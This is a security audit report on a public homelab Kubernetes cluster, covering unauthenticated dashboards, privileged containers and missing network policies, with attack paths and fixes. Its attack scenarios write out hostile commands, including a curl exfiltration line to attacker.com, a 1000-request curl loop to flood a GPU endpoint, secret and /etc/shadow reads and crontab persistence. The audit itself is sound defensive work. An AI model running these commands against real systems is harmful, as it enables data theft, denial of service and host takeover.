# FAKO CLUSTER SECURITY AUDIT REPORT
## Public Homelab Infrastructure (K3s + Cloudflare Tunnels)

**Audit Date:** January 26, 2026
**Focus:** Realistic threats to a public homelab with sensitive services
**Classification:** CRITICAL findings require immediate action

---

## EXECUTIVE SUMMARY

The fako-cluster is a well-architected homelab running 40+ services across 7 nodes with GPU workloads, but has significant **authentication and network isolation gaps** that would allow attackers to escalate from limited access to full cluster compromise.

**Key Risk:** Multiple critical services are exposed without proper authentication OR with weak controls, creating a cascade failure where compromise of one service leads to compromise of the entire infrastructure.

---

## 1. PUBLIC INFORMATION DISCLOSURE

### A. GitHub Repository Reveals Full Infrastructure

**Threat:** Attackers can map the entire infrastructure without technical scanning
**Impact:** Enables targeted attack planning with zero reconnaissance effort
**Evidence:**
- README.md documents 40+ services, internal DNS names (*.landryzetam.net), GPU specs (RTX 5070, RTX 3050), node hostnames
- Kustomize manifests expose all deployed services, versions, and configurations
- Network architecture documented: "UGREEN NAS at 10.85.30.127", "3-node PostgreSQL HA cluster"
- CLAUDE.md and notes/ contain operational procedures and debugging information
- External integrations documented: Keycloak, OAuth2 Proxy, AWS Secrets Manager, Discord bots

**Hidden Service Topology Exposed:**
- 20+ externally accessible domains on landryzetam.net: ai.landryzetam.net (OpenWebUI), auth.landryzetam.net (Keycloak), pgadmin.landryzetam.net, n8n.landryzetam.net, ollama.landryzetam.net
- Internal service endpoints in manifests: postgres-cluster-rw.postgres.svc.cluster.local
- SSH targets: UGREEN NAS at specific IP, K3s nodes with documented hostnames

**Likelihood:** HIGH - Public GitHub repository
**Effort:** Quick (<15min) - Attacker just reads repo and creates attack checklist
**Fix:**
1. Create private mirror repo for infrastructure (ASAP)
2. Remove specific IP addresses and internal DNS names from public README
3. Document only high-level architecture, not specific IPs/hostnames
4. Audit git history for secrets that may have been committed before ExternalSecrets adoption

---

### B. Docker Image Versions Expose Known Vulnerabilities

**Threat:** Specific versions in manifests can be checked against CVE databases
**Impact:** Attackers know exactly which services are vulnerable to what exploits
**Evidence:**
- Ollama: `ollama:0.12.3` (specific version)
- Headlamp: `v0.33.0` (specific version)
- Keycloak: Versions documented in deployment comments
- Historical Dockerfiles in repo may reference old base image versions

**Likelihood:** MEDIUM - Renovate bot automates version updates, but lag exists
**Effort:** Medium (15-60min) - Search for CVEs in known versions
**Fix:**
1. Enable Renovate security updates with "automerge" for patch versions
2. Create GitHub Actions workflow to scan images for known CVEs weekly
3. Document minimum supported versions for each service
4. Remove very old image references from notes/

---

## 2. AUTHENTICATION & ACCESS CONTROL GAPS

### CRITICAL-A: Headlamp K8s Dashboard Exposed Without Authentication

**File:** `/apps/base/headlamp/`
**Threat:** Full cluster admin access via web UI with NO authentication layer
**Impact:** Attacker gains complete Kubernetes cluster compromise
**Evidence:**
```yaml
# headlamp/rbac.yaml - FULL PERMISSIONS
apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
# This grants ClusterRole with wildcard access to EVERYTHING
```
```yaml
# headlamp/ingress.yaml - DIRECTLY EXPOSED
- host: headlamp.landryzetam.net
  http:
    paths:
      - path: /
        backend:
          service:
            name: headlamp
            port:
              number: 80
# NO authentication annotation, NO OAuth2 proxy, NO OAuth2-Proxy middleware
```

**Attack Path:**
1. Attacker discovers headlamp.landryzetam.net from GitHub README
2. Opens browser → Full K8s dashboard (no login required)
3. Creates admin user, modifies deployments, exfiltrates secrets
4. Escalates to accessing NAS, databases, other internal services

**Likelihood:** CRITICAL - Headlamp has no auth mechanism
**User Impact:** Cluster completely compromised - attacker can:
- Delete all workloads (DoS)
- Modify pod specs to add malicious containers
- Access all Kubernetes secrets (database passwords, API keys)
- Create privileged pods with host access
- Modify network policies to enable further attacks

**Fix - IMMEDIATE (Quick, <15min):**
1. Remove headlamp from public ingress (disable ingress, use port-forward only)
2. Add OAuth2-Proxy authentication middleware if external access needed
3. Restrict to internal network only via network policy

**Recommended Pattern:**
```yaml
# headlamp/ingress.yaml - PROTECTED VERSION
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: headlamp
  namespace: headlamp
  annotations:
    traefik.ingress.kubernetes.io/router.middlewares: headlamp-oauth@kubernetescrd
spec:
  ingressClassName: traefik
  rules:
  - host: headlamp.landryzetam.net
    http:
      paths:
      - path: /
        backend:
          service:
            name: headlamp-oauth2-proxy
            port:
              number: 4180  # OAuth2 Proxy intercepts here
---
# Add OAuth2-Proxy deployment (see oura-dashboard pattern)
```

**Or better - remove public access entirely:**
```bash
# Access via kubectl port-forward (local machine only)
kubectl port-forward -n headlamp svc/headlamp 4466:80
# Then access http://localhost:4466 (only from your machine)
```

---

### CRITICAL-B: pgAdmin Database Admin Tool Exposed Without Authentication

**File:** `/apps/base/pgadmin/ingress.yaml`
**Threat:** Full database admin access via web UI with NO authentication
**Impact:** Attacker can read/modify/delete all databases on the cluster
**Evidence:**
```yaml
# pgadmin/ingress.yaml - NO AUTH
- host: pgadmin.landryzetam.net
  http:
    paths:
    - path: /
      backend:
        service:
          name: pgadmin
          port:
            number: 80
# No OAuth2-Proxy annotation, no authentication requirement
```

**Attack Path:**
1. Attacker discovers pgadmin.landryzetam.net from README
2. Opens browser, sees pgAdmin UI
3. Navigates to "Servers" → connects to postgres-cluster-rw.postgres.svc.cluster.local:5432
4. Executes arbitrary SQL: `DROP TABLE quantum_trades_data;` or `SELECT * FROM users;`
5. If default credentials exist: full database compromise

**pgAdmin Default Access Risk:**
- pgAdmin comes with default admin user (usually admin@pgadmin.org / admin)
- Deployment config likely sets PGADMIN_DEFAULT_EMAIL/PASSWORD in ConfigMap
- These credentials might be in git history or visible in pod environment

**Likelihood:** CRITICAL - No auth layer
**User Impact:**
- Quantum-trades trading data deleted
- Oura health data exfiltrated
- User accounts and personal information compromised
- All microservice databases corrupted

**Fix - IMMEDIATE (Quick, <15min):**
1. Add OAuth2-Proxy middleware (same pattern as headlamp)
2. Or remove public access → local access only via port-forward

**Long-term:**
1. Enable pgAdmin MFA if public access needed
2. Use IP whitelisting: only allow from Cloudflare tunnel IPs
3. Implement network policy: pgAdmin can only reach postgres-cluster namespace

---

### HIGH-C: Ollama API Exposed as Public LLM Service

**File:** `/apps/base/ollama/ingress.yaml`
**Threat:** Public LLM API without rate limiting or authentication
**Impact:**
- Resource exhaustion (DoS) via compute-intensive requests
- Model enumeration and API reconnaissance
- Unauthorized use of your GPU resources

**Evidence:**
```yaml
# ollama/ingress.yaml - NO AUTH REQUIRED
- host: ollama.landryzetam.net
  http:
    paths:
    - path: /
      backend:
        service:
          name: ollama-gpu
          port:
            number: 11434
# No auth, no rate limiting
```

**Attack Path:**
1. `curl https://ollama.landryzetam.net/api/tags` → List all downloaded models
2. `curl https://ollama.landryzetam.net/api/generate -X POST -d '{"model":"llama2","prompt":"...", "stream":false}'`
3. Attacker sends 1000 concurrent requests → RTX 5070 GPU maxes out
4. All legitimate traffic stalls, cluster becomes unresponsive

**Likelihood:** MEDIUM-HIGH - Ollama is designed as local service, not public API
**User Impact:**
- GPU unavailable for legitimate voice AI tasks (Whisper, Piper)
- All voice-dependent services (family-manager, home automation) fail
- Significant power consumption and heat on hardware

**Fix - MEDIUM (15-60min):**
1. Add rate limiting middleware to Traefik ingress:
   ```yaml
   annotations:
     traefik.ingress.kubernetes.io/router.middlewares: ollama-ratelimit@kubernetescrd
   ```
2. Create RateLimit middleware: max 10 requests/min per IP
3. Add OAuth2-Proxy for authentication if API needs to be public
4. Implement request size limiting (prevent huge prompt attacks)

**Better Fix:**
1. Remove Ollama from public ingress
2. Access only from within cluster (for OpenWebUI, n8n, etc.)
3. Use internal service name: `http://ollama-gpu.ollama.svc.cluster.local:11434`

---

### HIGH-D: OpenWebUI and Ollama-WebUI Lack Proper Access Control

**File:** `/apps/base/open-webui/ingress.yaml`, `/apps/base/ollama-webui/ingress.yaml`
**Threat:** Chat UI exposed with no authentication or user segregation
**Impact:**
- Unauthorized use of LLM resources
- Potential jailbreak attempts (if models have been finetuned on sensitive data)
- Use of your computing power for malicious purposes

**Evidence:**
```yaml
# open-webui/ingress.yaml
- host: ai.landryzetam.net
  http:
    paths:
    - path: /
      backend:
        service:
          name: open-webui
# No authentication annotation
```

**Likelihood:** MEDIUM - Attackers will try common endpoints
**User Impact:**
- Unauthorized LLM API usage
- Potential data leakage if models were trained on personal data
- GPU resources consumed by attackers

**Fix - MEDIUM (15-60min):**
1. Add OAuth2-Proxy in front of OpenWebUI
2. Configure Keycloak OIDC provider
3. Route: ai.landryzetam.net → OAuth2-Proxy (validates token) → OpenWebUI

---

## 3. DATABASE & CREDENTIAL ACCESS RISKS

### HIGH-E: PostgreSQL Admin Tools Accessible to Cluster Pods

**Threat:** Any compromised pod can reach postgres-cluster-rw without network isolation
**Impact:** If pod is compromised, database is automatically compromised
**Evidence:**
- No NetworkPolicy restricting access to postgres namespace
- All pods run in separate namespaces but can reach postgres-cluster-rw.postgres.svc.cluster.local
- Database connection strings likely in pod environment or configmaps

**Attack Path:**
1. Attacker compromises open-webui pod (via RCE or init script exploit)
2. From within pod: `psql -h postgres-cluster-rw.postgres -U admin -W`
3. Queries exfiltrate all data from all databases

**Likelihood:** MEDIUM - Requires pod compromise first, but no network isolation
**User Impact:** Compromise cascades from web app to database
**Fix - MEDIUM (15-60min):**
1. Create NetworkPolicy in postgres namespace:
   ```yaml
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: postgres-access-policy
     namespace: postgres
   spec:
     podSelector:
       matchLabels:
         app: postgres-cluster
     policyTypes:
     - Ingress
     ingress:
     - from:
       - namespaceSelector:
           matchLabels:
             db-access: "true"
       ports:
       - protocol: TCP
         port: 5432
   ```
2. Label only namespaces that need DB access: `kubectl label namespace oura-collector db-access=true`
3. Deny all other access

---

### HIGH-F: AWS Credentials Stored in Kubernetes Secrets

**Threat:** If cluster RBAC is compromised, AWS credentials are accessible
**Impact:** Attacker can access AWS Secrets Manager where all sensitive data is stored
**Evidence:**
- ExternalSecrets stores AWS credential secret in cluster
- Any pod with permissions can read it: `kubectl get secret aws-credentials-secret -o yaml`
- If pod security is weak (privileged containers), root access leads to secret theft

**Attack Path:**
1. Attacker escapes from privileged container (e.g., mcp-gateway with Docker-in-Docker)
2. Accesses kubernetes service account token from `/var/run/secrets/kubernetes.io/serviceaccount/token`
3. Queries Kubernetes API with service account: `kubectl get secrets -A`
4. Finds aws-credentials-secret, base64 decodes, gets AWS Access Key ID and Secret Access Key
5. `aws secretsmanager list-secrets` → discovers all AWS secrets
6. Exfiltrates database passwords, API keys, etc.

**Likelihood:** MEDIUM - Requires privileged pod + weak RBAC
**User Impact:** Complete infrastructure compromise - AWS account fully accessible
**Fix - HIGH (>1hr):**
1. Use Kubernetes Service Account IAM (IRSA) if supported by K3s
   - Avoids storing long-term AWS credentials in secrets
   - ExternalSecrets gets temporary credentials via STS
2. Or: Create AWS IAM User with minimal permissions (ExternalSecrets only)
   - Cannot list all secrets, only read specific ones
3. Implement Pod Security Standards: disable privileged containers
4. Use RBAC: limit who can read AWS credentials secret

---

## 4. PRIVILEGED CONTAINER & ESCALATION RISKS

### MEDIUM-G: Docker-in-Docker (mcp-gateway) Runs Privileged

**File:** `/apps/base/mcp-gateway/deployment.yaml`
**Evidence:**
```yaml
containers:
- name: mcp-gateway
  image: mcp-gateway
  securityContext:
    privileged: true  # DANGEROUS
```

**Threat:** Privileged container can escape to host
**Impact:** Attacker gains host-level access (can then access all pods, volumes, etc.)
**Attack Path:**
1. Attacker gains RCE in mcp-gateway pod
2. Runs: `docker exec -it <container> sh`
3. From there: mount host filesystem, modify /etc/passwd, install backdoor

**Likelihood:** MEDIUM - Requires RCE first, then escape attempt
**User Impact:** Complete host compromise
**Fix - MEDIUM (15-60min):**
1. Replace Docker-in-Docker with Podman in unprivileged mode if possible
2. Or: Use Docker socket mounting with strict RBAC instead of privileged mode
3. Run container as non-root even with privileged=true
4. Limit host mounts to read-only where possible

---

### MEDIUM-H: Kube-Bench Runs Privileged for Security Auditing

**File:** `/apps/base/kube-bench/cronjob.yaml`
**Evidence:**
```yaml
spec:
  template:
    spec:
      privileged: true
```

**Threat:** CronJob runs privileged regularly, increasing attack surface
**Impact:** If job is compromised, regular privilege escalation opportunity
**Likelihood:** LOW - CronJob runs on schedule, not always accessible
**Fix - QUICK (<15min):**
1. Verify kube-bench actually needs privileged mode (usually doesn't for audit-only)
2. If audit-only: remove privileged flag
3. Restrict CronJob execution to specific nodes: `nodeSelector: security-audit-node`

---

## 5. NETWORK ISOLATION & SEGMENTATION

### MEDIUM-I: Minimal Network Policies (Only 6 of 40+ Services)

**Threat:** Pods can communicate freely across namespaces
**Impact:** If one service is compromised, attacker can move laterally to other services
**Evidence:**
- NetworkPolicy files: only 6 exist (autobots, fetch-mcp, n8n-mcp, puppeteer-mcp, task-tracker, zi)
- 34+ services have NO network policies
- Default K3s behavior: all pods can reach all other pods

**Attack Path:**
1. Attacker compromises open-webui pod
2. From open-webui, can reach: n8n, postgresql, keycloak, ollama, etc.
3. Moves laterally to reach family-manager pod → Telegram API keys
4. Then reaches n8n → all workflow execution capabilities
5. Full infrastructure compromise via pivot

**Likelihood:** HIGH - No lateral movement restrictions
**User Impact:** Single service compromise → total infrastructure compromise
**Fix - HIGH (>1hr):**
1. Create default-deny NetworkPolicy in each namespace:
   ```yaml
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: deny-all-ingress
     namespace: open-webui
   spec:
     podSelector: {}
     policyTypes:
     - Ingress
     # Blocks ALL ingress unless explicitly allowed
   ```
2. Whitelist only required communications:
   ```yaml
   ingress:
   - from:
     - podSelector:
         matchLabels:
           role: proxy
   ```
3. Priority: Database namespaces first, then high-value services

---

### MEDIUM-J: No Egress Filtering

**Threat:** Compromised pod can exfiltrate data to internet
**Impact:** Attacker can steal data, contact command & control servers
**Evidence:**
- No egress NetworkPolicy found in most services
- Pods can reach: AWS Secrets Manager, Discord webhooks, external APIs

**Attack Path:**
1. Attacker compromises open-webui pod
2. Injects exfiltration code: `curl https://attacker.com/exfil -d <all-env-vars>`
3. All pod secrets (API keys, tokens) sent to attacker
4. Attacker also controls family-manager pod, sends personal data to attacker.com

**Likelihood:** MEDIUM - Requires pod compromise, but easy to exploit
**User Impact:** Data exfiltration
**Fix - MEDIUM (15-60min):**
1. Add egress policies to restrict where pods can connect
2. Example: voice-pipeline should only reach Ollama, not internet
3. Family-manager should only reach Telegram API, not random hosts

---

## 6. CONTAINER & PROCESS ISOLATION

### MEDIUM-K: Multiple Containers Running as Root or UID 0

**Evidence:**
- postgres-cluster pvc-and-permissions: `runAsUser: 0` (root)
- family-manager redis: `runAsUser: 0` (root)
- Several GPU workloads: runAsUser defaults to 0 if not specified

**Threat:** Process running as root can modify system, install backdoors
**Impact:** Elevated privileges for attacker within pod
**Likelihood:** MEDIUM - Requires pod compromise, but easier to escalate
**Fix - QUICK (<15min):**
1. Audit why each service runs as root
2. For PostgreSQL init: use init container only, then main app runs as postgres user
3. For Redis: runs should use unprivileged user (redis:redis typically)
4. Policy: all containers runAsUser must be >= 1000 (non-root)

---

## 7. DEFAULT CREDENTIALS & WEAK AUTHENTICATION

### MEDIUM-L: pgAdmin Default Credentials Risk

**Threat:** pgAdmin may use default admin credentials
**Impact:** No password required to access database admin panel
**Evidence:**
- Deployment sets PGADMIN_DEFAULT_EMAIL/PASSWORD in ConfigMap or ExternalSecret
- If ConfigMap (not encrypted), password visible in git/backup

**Fix - QUICK (<15min):**
1. Verify pgAdmin credentials are stored in AWS Secrets Manager, not ConfigMap
2. Check: `kubectl get configmap -n pgadmin pgadmin-configmap -o yaml | grep -i password`
3. If password in ConfigMap, move to ExternalSecret immediately

---

### MEDIUM-M: Keycloak Initial Setup Weak

**Threat:** Keycloak admin user may use weak password or default credentials
**Impact:** Identity provider completely compromised
**Evidence:**
- Keycloak deployment uses ExternalSecret for credentials (good)
- But: initial setup might use "admin" / "password" before secret is applied

**Likelihood:** LOW if ExternalSecret timing is correct, MEDIUM if timing issues exist
**Fix - QUICK (<15min):**
1. Verify ExternalSecret syncs BEFORE Keycloak pod starts
2. Check: `kubectl get event -n keycloak | grep -i secret`
3. If timing issues, add: `initWaitForSecret` in deployment spec

---

## 8. SPECIFIC ATTACK SCENARIOS & LIKELIHOOD

### Scenario 1: Attacker Finds headlamp.landryzetam.net and Gains Full Cluster Access

**Entry Point:** GitHub README discloses service name
**Steps:**
1. Read public GitHub repo → find headlamp.landryzetam.net
2. Visit https://headlamp.landryzetam.net → no login, full K8s dashboard
3. Click "Users" → create new admin user with password "attacker"
4. Access Kubernetes secrets: `get secret -A | grep -i password`
5. Find postgres secret, decode base64 → database credentials
6. Connect to postgres-cluster-rw, download all data

**Total Time:** 15 minutes
**Likelihood:** CRITICAL
**Blast Radius:** Total infrastructure compromise

**Fix Priority:** IMMEDIATE - Remove headlamp from public access

---

### Scenario 2: Attacker Performs DoS on Ollama GPU

**Entry Point:** GitHub README + basic HTTP knowledge
**Steps:**
1. Write script: `for i in {1..1000}; do curl -X POST https://ollama.landryzetam.net/api/generate -d '{"model":"llama2","prompt":"test..."}' & done`
2. Run script → 1000 concurrent GPU inference requests
3. RTX 5070 GPU maxes out, becomes unresponsive
4. All voice-dependent services fail (family-manager voice commands, home automation)
5. Can be repeated indefinitely

**Total Time:** 5 minutes
**Likelihood:** MEDIUM-HIGH
**Blast Radius:** Voice pipeline down, potential energy waste

**Fix Priority:** HIGH - Add rate limiting to Ollama ingress

---

### Scenario 3: Pod Escape via Privileged mcp-gateway Container

**Entry Point:** RCE in mcp-gateway (vulnerability in MCP implementation)
**Steps:**
1. Exploit RCE in mcp-gateway container
2. Container runs `privileged: true` → full host access
3. Mount host filesystem: `mount -t proc /proc /mnt/host/proc`
4. Install persistence: `cat /mnt/host/etc/shadow`, modify `/mnt/host/etc/crontab`
5. Backdoor all future processes on host

**Total Time:** 30 minutes
**Likelihood:** MEDIUM (if RCE exists in MCP code)
**Blast Radius:** Host-level compromise, all workloads affected

**Fix Priority:** HIGH - Disable privileged mode or replace with Podman

---

### Scenario 4: Lateral Movement via Unprotected Network

**Entry Point:** Compromise of open-webui
**Steps:**
1. OpenWebUI code vulnerability → RCE in open-webui pod
2. From pod shell: `curl postgres-cluster-rw.postgres:5432` → connected
3. No network policy, can reach any service
4. Scan local network: `nmap -p- 10.0.0.0/8` → discover internal services
5. Connect to keycloak-service → extract user credentials
6. Connect to n8n → dump workflow definitions (may contain API keys)
7. Extract: Oura API tokens, Telegram bot tokens, Discord webhooks

**Total Time:** 20 minutes
**Likelihood:** HIGH (if no network segmentation)
**Blast Radius:** All service credentials compromised

**Fix Priority:** HIGH - Implement network policies, namespace isolation

---

## 9. INFORMATION LEAKAGE IN CONFIGURATION

### MEDIUM-N: GPU UUID Exposed in Deployment

**File:** `/apps/base/ollama/deployment-gpu.yaml`
**Evidence:**
```yaml
- name: NVIDIA_VISIBLE_DEVICES
  value: "GPU-da81442d-aa44-f32e-877c-57e59ed0bb8b"  # RTX 5060 UUID exposed
```

**Threat:** GPU UUID fingerprints the exact hardware, enables targeted exploits
**Impact:** Attacker knows exactly which GPU, can target GPU-specific memory attacks
**Fix - QUICK (<15min):**
1. Move GPU UUID to ConfigMap (still in repo, but separated from main deployment)
2. Better: Use node selector and toleration, let NVIDIA Operator handle GPU selection

---

### MEDIUM-O: Internal DNS Names in Comments/Manifests

**Evidence:**
- Comments reference: `postgres-cluster-rw.postgres.svc.cluster.local`
- Deployment specs reference: `postgres-cluster-ro.postgres.svc.cluster.local`
- OAuth2 proxy configurations reference internal IPs

**Threat:** Attacker learns exact service discovery DNS names
**Impact:** From compromised pod, attacker knows exactly which hostnames to attack
**Fix - QUICK (<15min):**
1. Audit all comments for service names, remove where not essential
2. Reference services by generic names in non-critical comments

---

## 10. RECOMMENDATIONS SUMMARY

### IMMEDIATE (Today - <15min each)

| Issue | Action | Effort |
|-------|--------|--------|
| CRITICAL: Headlamp exposed without auth | Remove from public ingress, use port-forward only | Quick |
| CRITICAL: pgAdmin exposed without auth | Add OAuth2-Proxy or remove public access | Quick |
| HIGH: Update GitHub README | Remove specific IPs, internal DNS names, node hostnames | Quick |
| HIGH: Audit git history for secrets | Run `gitleaks` scan, rotate any found credentials | Medium |

### SHORT-TERM (This Week - 15-60min each)

| Issue | Action | Effort |
|-------|--------|--------|
| HIGH: Rate limit Ollama API | Add Traefik rate-limit middleware | Medium |
| HIGH: Network policies for all services | Start with default-deny, whitelist required connections | High |
| HIGH: Disable privileged containers | Audit why mcp-gateway needs privileged, remove if possible | Medium |
| MEDIUM: Database network isolation | NetworkPolicy restricting postgres access to approved namespaces | Medium |
| MEDIUM: Pod security policy | Ensure all containers run as non-root (UID >= 1000) | Medium |

### LONG-TERM (Next Month - >1hr each)

| Issue | Action | Effort |
|-------|--------|--------|
| HIGH: Implement Pod Security Standards | Enforce restricted/baseline profile cluster-wide | High |
| HIGH: Create private infrastructure mirror repo | Move sensitive config to private GitHub repo | High |
| MEDIUM: Implement IRSA for AWS credentials | Use K3s service account IAM instead of long-term keys | High |
| MEDIUM: Add egress network policies | Restrict where each pod can reach externally | High |
| MEDIUM: Implement secrets encryption at rest | Enable etcd encryption for Kubernetes secrets | High |

---

## RISK MATRIX: Homelab-Specific Threats

| Threat | Likelihood | Severity | Time to Exploit |
|--------|-----------|----------|-----------------|
| Headlamp cluster compromise | CRITICAL | CRITICAL | 2 minutes |
| pgAdmin database access | CRITICAL | CRITICAL | 2 minutes |
| Ollama DoS (GPU consumption) | HIGH | HIGH | 5 minutes |
| Lateral movement via network | HIGH | CRITICAL | 20 minutes |
| Malicious model injection | MEDIUM | MEDIUM | 30 minutes |
| Data exfiltration from compromised pod | MEDIUM | HIGH | 15 minutes |
| Host escape via privileged container | MEDIUM | CRITICAL | 30 minutes |
| AWS credential theft | MEDIUM | CRITICAL | 30 minutes |
| Default credential abuse | LOW | CRITICAL | 5 minutes |

---

## SECURITY WINS (What's Working Well)

1. **ExternalSecrets pattern** - Credentials not hardcoded, stored in AWS Secrets Manager (GOOD)
2. **Ingress TLS/HTTPS** - All public services use Let's Encrypt certs (GOOD)
3. **Non-root services** - Most workloads run as unprivileged users (GOOD)
4. **Flux GitOps** - No manual kubectl apply, changes tracked in git (GOOD)
5. **Cloudflare Tunnels** - No direct port exposure, tunneled access only (GOOD)
6. **Namespace isolation** - Each service in separate namespace (GOOD)

---

## CONCLUSION

The fako-cluster is well-engineered for **functionality** and **reliability**, but has **critical authentication gaps** that make several high-value services (Headlamp, pgAdmin) accessible without authorization. The combination of:

1. **Public GitHub repo** exposing full architecture
2. **No authentication** on cluster dashboard and database admin tools
3. **No network policies** enabling lateral movement
4. **Privileged containers** enabling host escape

...creates a **low-barrier path to complete infrastructure compromise** in ~15 minutes.

**The good news:** These are mostly **quick fixes** that don't require architectural changes. Focus on the IMMEDIATE and SHORT-TERM recommendations first. The cluster architecture itself is solid - it just needs tighter access controls.
